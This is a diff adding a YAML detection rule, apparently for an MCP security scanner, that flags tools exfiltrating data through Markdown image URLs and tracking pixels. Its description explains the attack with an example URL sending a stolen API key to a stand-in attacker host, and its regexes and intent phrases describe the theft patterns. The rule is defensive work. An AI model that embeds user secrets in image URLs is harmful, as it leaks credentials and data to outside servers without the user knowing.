@@ -1,0 +1,70 @@
+id: image-url-data-exfiltration
+schema_version: 1
+info:
+  name: Image/URL-Based Data Exfiltration
+  author: mcp-lattice-community
+  severity: critical
+  description: |
+    Detects tools that embed sensitive data in image URLs, tracking pixels, or external
+    resource references for exfiltration. A malicious tool can construct a URL like
+    "https://attacker.com/img?data=STOLEN_API_KEY" and render it as a Markdown image
+    in the LLM's response. When the client renders this image, the browser/client makes
+    a GET request to the attacker's server, transmitting the stolen data in the URL
+    parameters. This technique is particularly effective because image rendering happens
+    automatically in most LLM clients without user interaction. The attack exploits the
+    gap between tool output (text) and client rendering (HTTP requests).
+  tags:
+    - data-exfiltration
+    - image-url
+    - markdown-injection
+    - tracking-pixel
+    - side-channel
+  references:
+    - https://embracethered.com/blog/posts/2023/chatgpt-plugin-data-exfiltration-via-images/
+    - https://blog.trailofbits.com/2025/04/23/a-comprehensive-guide-to-mcp-security-risks/
+    - https://arxiv.org/abs/2504.03767
+  remediation: |
+    1. Sanitize all tool outputs to prevent injection of Markdown image syntax.
+    2. Implement Content Security Policy (CSP) in LLM clients to restrict image sources.
+    3. Proxy all external images through a trusted server that strips query parameters.
+    4. Block or warn on images loaded from unknown domains in tool responses.
+    5. Disable automatic image rendering for tool outputs; require user click-to-load.
+    6. Scan tool outputs for URL patterns containing data that appears to be exfiltrated
+       (encoded strings, API key patterns, file contents).
+    7. Implement output sanitization that removes or escapes Markdown image/link syntax.
+  false_positive_notes: |
+    Tools that legitimately return images (screenshot tools, chart generators, image
+    search tools) will contain image URLs in their output. The key differentiator is
+    whether the URL contains user data in query parameters. Static image URLs to known
+    CDNs or image hosting services are typically benign. Focus on URLs with dynamic
+    query parameters containing encoded or suspicious data.
+
+classification:
+  attack-class: data-exfiltration
+  cosai-category: 5
+  owasp-agentic: ASI05
+
+mcp:
+  target: tools/call
+  analysis:
+    - type: pattern
+      part: tool_description
+      patterns:
+        - regex: "(?i)!\\[(?:[^\\]]*)\\]\\(https?://[^)]*[?&](?:data|payload|content|token|key|secret|info|d|q|p)=[^)]+\\)"
+        - regex: "(?i)(?:img|image|pixel|tracker|beacon)\\s*(?:src|url|href)\\s*=\\s*['\"]?https?://[^'\"\\s]*[?&](?:d|data|payload|token|key)="
+        - regex: "(?i)<img\\s+[^>]*src\\s*=\\s*['\"]https?://[^'\"]*[?&](?:data|payload|token|key|content)=[^'\"]*['\"]"
+        - regex: "(?i)(?:render|display|show|embed|inject|insert|include)\\s+(?:an?\\s+)?(?:image|img|pixel|beacon|tracker)\\s+(?:with|containing|from|using)"
+    - type: pattern
+      part: input_schema
+      patterns:
+        - regex: "(?i)\"(?:image_url|img_url|pixel_url|tracker_url|beacon_url|callback_url|webhook_url|exfil_url)\"\\s*:\\s*\\{"
+        - regex: "(?i)\"(?:render_image|show_image|display_image|embed_image|inject_image)\"\\s*:\\s*\\{"
+    - type: semantic
+      part: tool_description
+      model: all-MiniLM-L6-v2
+      threshold: 0.72
+      malicious_intents:
+        - "embed sensitive data in an image URL"
+        - "render a tracking pixel with user data"
+        - "send data to an external server through an image request"
+        - "exfiltrate information via markdown image rendering"
